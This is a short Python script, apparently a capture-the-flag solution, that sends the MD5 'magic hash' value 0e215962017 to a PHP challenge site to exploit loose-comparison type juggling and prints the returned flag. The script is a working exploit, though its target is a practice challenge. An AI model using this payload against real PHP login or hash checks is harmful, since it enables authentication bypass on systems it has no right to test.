import requests

"""
vulnerabilty: php type juggling
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling

scegliere un paylaod MD5, 0e215962017 va bene
"""

url = 'http://confuse-me.challs.olicyber.it/'
payload = {'input':'0e215962017'}

r = requests.post(url, params=payload).text

for line in r.splitlines():
    if "flag{" in line.lower():
        print(line)

